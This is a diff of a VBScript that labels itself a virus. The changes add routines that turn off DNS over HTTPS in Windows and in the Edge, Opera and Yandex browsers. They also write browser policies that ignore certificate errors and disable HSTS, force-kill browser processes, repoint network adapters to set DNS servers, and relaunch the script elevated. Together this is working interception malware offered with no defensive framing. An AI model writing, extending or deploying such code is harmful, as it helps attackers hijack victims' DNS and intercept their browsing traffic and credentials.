@@ -18,24 +18,33 @@ Sub MainScriptLogic()
 
 	FireFox
 
-    FireFox2
-   
-    Dim objWMIService, colAdapters, objAdapter
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")
+    Edge
 
-    For Each objAdapter In colAdapters
-        If objAdapter.IPEnabled Then
-            Dim arrDNSServers
-            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
-            objAdapter.SetDNSServerSearchOrder arrDNSServers
-        End If
-    Next
+    Opera
 
-    Set objWMIService = Nothing
+    Dns
+    
+    Yandex
 
     MsgBox "Virus OK"
 End Sub
+
+Function IsAdmin()
+    Dim objWShell, result
+    Set objWShell = CreateObject("WScript.Shell")
+    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
+    IsAdmin = (result = 0)
+    Set objWShell = Nothing
+End Function
+
+Sub RunElevated()
+    Dim objShell
+    Set objShell = CreateObject("Shell.Application")
+    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
+    WScript.Quit
+End Sub
+
+
 
 Sub Chrome
 	Dim objShell
@@ -88,7 +97,13 @@ Sub Firefox()
 
     Set objFSO = Nothing
     Set objShell = Nothing
+
+    FireFox2
 End Sub
+
+
+
+
 
 Sub FireFox2
     Const HKEY_LOCAL_MACHINE = &H80000002
@@ -118,25 +133,249 @@ Sub FireFox2
     Next
 
     Set objShell = Nothing
-
 End Sub
 
-Function IsAdmin()
-    Dim objWShell, result
-    Set objWShell = CreateObject("WScript.Shell")
-    result = objWShell.Run("cmd /c net session >nul 2>&1", 0, True)
-    IsAdmin = (result = 0)
-    Set objWShell = Nothing
+
+
+
+
+Sub Edge
+    Dim objShell
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Disable DNS over HTTPS (DoH) in the system registry
+    objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"
+    
+    ' Configure Edge policies
+    Const HKEY_LOCAL_MACHINE = &H80000002
+    Dim edgeKeyPath
+    edgeKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
+    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\CommandLine", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
+    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & edgeKeyPath & "\DnsOverHttps", "off", "REG_SZ"
+
+    ' Create and set registry key for ignoring certificate errors
+    Dim strKeyPath
+    Dim strValueName
+    Dim dwValue
+    strKeyPath = "SOFTWARE\Policies\Microsoft\Edge"
+    strValueName = "IgnoreCertificateErrors"
+    dwValue = 1
+    Dim objRegistry
+    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
+    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
+    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
+End Sub
+
+
+
+Sub Yandex
+    Dim objShell, SettingsFilePath, objFSO, objFile, strContents
+    Dim possiblePaths, i
+    Set objShell = CreateObject("WScript.Shell")
+
+    possiblePaths = Array( _
+        GetYandexInstallationPathFromAppData() & "\Local State")
+
+    For i = LBound(possiblePaths) To UBound(possiblePaths)
+        SettingsFilePath = possiblePaths(i)
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        DisableDoHInYandex objFSO, SettingsFilePath
+    Next
+End Sub
+
+Function DisableDoHInYandex(objFSO, FilePath)
+    If Not objFSO.FileExists(FilePath) Then
+        Exit Function
+    End If
+
+    Dim processes
+    processes = Array("service_update.exe", "browser.exe")
+    KillProcesses processes
+    
+    Dim jsonContent, jsonFile
+    Set jsonFile = objFSO.OpenTextFile(FilePath, 1)
+    jsonContent = jsonFile.ReadAll
+    jsonFile.Close
+    
+    Dim regexPattern
+    regexPattern = """dns_over_https""\s*:\s*\{[^}]*""mode""\s*:\s*""([^""]+)"""
+    
+    Dim regex
+    Set regex = New RegExp
+    regex.Pattern = regexPattern
+    regex.IgnoreCase = True
+    regex.Global = True
+    
+    If regex.Test(jsonContent) Then
+        jsonContent = regex.Replace(jsonContent, """dns_over_https"":{""mode"":""off""")
+        
+        Set jsonFile = objFSO.OpenTextFile(FilePath, 2)
+        jsonFile.Write jsonContent
+        jsonFile.Close
+        
+        DisableDoHInYandex = "DNS over HTTPS mode set to 'off' in file: " & FilePath
+    End If
 End Function
 
-Sub RunElevated()
+Function GetYandexInstallationPathFromAppData()
+    Dim appDataPath, operaInstallationPath
+    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
+    operaInstallationPath = appDataPath & "\Yandex\YandexBrowser\User Data"
+    GetYandexInstallationPathFromAppData = operaInstallationPath 
+End Function
+
+
+
+
+Sub Opera
     Dim objShell
-    Set objShell = CreateObject("Shell.Application")
-    objShell.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
-    WScript.Quit
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' Disable DNS over HTTPS (DoH) in the system registry
+    objShell.RegWrite "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableAutoDOH", 0, "REG_DWORD"
+    
+    ' Configure Opera policies
+    Const HKEY_LOCAL_MACHINE = &H80000002
+    Dim operaKeyPath
+    operaKeyPath = "SOFTWARE\Policies\Opera"
+    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & operaKeyPath & "\CommandLine", "--ignore-certificate-errors --disable-quic --disable-hsts", "REG_SZ"
+    objShell.RegWrite "HKEY_LOCAL_MACHINE\" & operaKeyPath & "\DnsOverHttps", "off", "REG_SZ"
+
+    ' Create and set registry key for ignoring certificate errors
+    Dim strKeyPath
+    Dim strValueName
+    Dim dwValue
+    strKeyPath = "SOFTWARE\Policies\Opera"
+    strValueName = "IgnoreCertificateErrors"
+    dwValue = 1
+    Dim objRegistry
+    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
+    objRegistry.CreateKey HKEY_LOCAL_MACHINE, strKeyPath
+    objRegistry.SetDWORDValue HKEY_LOCAL_MACHINE, strKeyPath, strValueName, dwValue
+
+    Opera2
 End Sub
 
+Sub Opera2()
+    Dim objShell, OperaSecurePreferencesFilePath, objFSO, objFile, strContents
+    Dim possiblePaths, i
+    Set objShell = CreateObject("WScript.Shell")
 
+    ' Array of possible paths for the Secure Preferences file
+    possiblePaths = Array( _
+        GetOperaInstallationPathFromProgramFiles() & "\Secure Preferences", _
+        GetOperaInstallationPathFromAppData() & "\Secure Preferences", _
+        GetOperaInstallationPathFromApplicationData() & "\Secure Preferences" _
+    )
+
+    ' Try each possible path
+    For i = LBound(possiblePaths) To UBound(possiblePaths)
+        OperaSecurePreferencesFilePath = possiblePaths(i)
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        If objFSO.FileExists(OperaSecurePreferencesFilePath) Then
+            ' Secure Preferences file found
+            DisableDoHInOpera objFSO, OperaSecurePreferencesFilePath
+            Exit Sub
+        End If
+    Next
+
+    ' If none of the paths contain the Secure Preferences file, display an error
+    MsgBox "Opera Secure Preferences file not found. Please check if Opera is installed correctly.", vbCritical, "Error"
+
+    Set objShell = Nothing
+End Sub
+
+Function DisableDoHInOpera(objFSO, FilePath)
+    Dim objFile, strContents, settingToCheck
+    ' Read the contents of the Secure Preferences file
+    Set objFile = objFSO.OpenTextFile(FilePath, 1)
+    strContents = objFile.ReadAll
+    objFile.Close
+
+    ' Setting to check if it's present in the file
+    settingToCheck = """dns_over_https_provider_selection"":1"
+
+    ' Check if the setting is already present in the file
+    If InStr(strContents, settingToCheck) = 0 Then
+        ' If setting is not present, add it
+        strContents = strContents & vbCrLf & "{" & settingToCheck & "}"
+        ' Write the modified contents back to the Secure Preferences file
+        Set objFile = objFSO.OpenTextFile(FilePath, 2)
+        objFile.Write strContents
+        objFile.Close
+        MsgBox "Added DNS-over-HTTPS provider selection setting to Opera Secure Preferences.", vbInformation, "Info"
+    Else
+        MsgBox "DNS-over-HTTPS provider selection setting already present in Opera Secure Preferences.", vbInformation, "Info"
+    End If
+End Function
+
+Function GetOperaInstallationPathFromProgramFiles()
+    Dim objShell, objFSO, objFolder, objFile
+    Set objShell = CreateObject("WScript.Shell")
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    On Error Resume Next
+    Set objFolder = objFSO.GetFolder(objShell.ExpandEnvironmentStrings("%PROGRAMFILES%"))
+    If Err.Number = 0 Then
+        For Each objFile In objFolder.Files
+            If InStr(1, objFile.Name, "opera.exe", vbTextCompare) > 0 Then
+                GetOperaInstallationPathFromProgramFiles = objFSO.GetParentFolderName(objFile.Path)
+                Exit Function
+            End If
+        Next
+    End If
+    On Error GoTo 0
+    GetOperaInstallationPathFromProgramFiles = ""
+End Function
+
+Function GetOperaInstallationPathFromAppData()
+    Dim appDataPath, operaInstallationPath
+    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%LOCALAPPDATA%")
+    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable\Default"
+    GetOperaInstallationPathFromAppData = operaInstallationPath
+End Function
+
+Function GetOperaInstallationPathFromApplicationData()
+    Dim appDataPath, operaInstallationPath
+    appDataPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPLICATIONDATA%")
+    operaInstallationPath = appDataPath & "\Opera Software\Opera Stable\Default"
+    GetOperaInstallationPathFromApplicationData = operaInstallationPath
+End Function
+
+
+
+
+
+
+
+
+
+Sub KillProcesses(arrProcesses)
+    Dim objShell
+    Dim process
+    Set objShell = CreateObject("WScript.Shell")
+    For Each process In arrProcesses
+        Dim command
+        command = "taskkill.exe /im " & process & " /f"
+        objShell.Run command, 0, True
+    Next
+    Set objShell = Nothing
+End Sub
+
+Sub Dns
+    Dim objWMIService, colAdapters, objAdapter
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colAdapters = objWMIService.ExecQuery("Select * from Win32_NetworkAdapterConfiguration")
+
+    For Each objAdapter In colAdapters
+        If objAdapter.IPEnabled Then
+            Dim arrDNSServers
+            arrDNSServers = Array(PrimaryDNSServer, SecondaryDNSServer)
+            objAdapter.SetDNSServerSearchOrder arrDNSServers
+        End If
+    Next
+
+    Set objWMIService = Nothing
+End Sub
 
 Function CertWorks()
     Dim binaryData
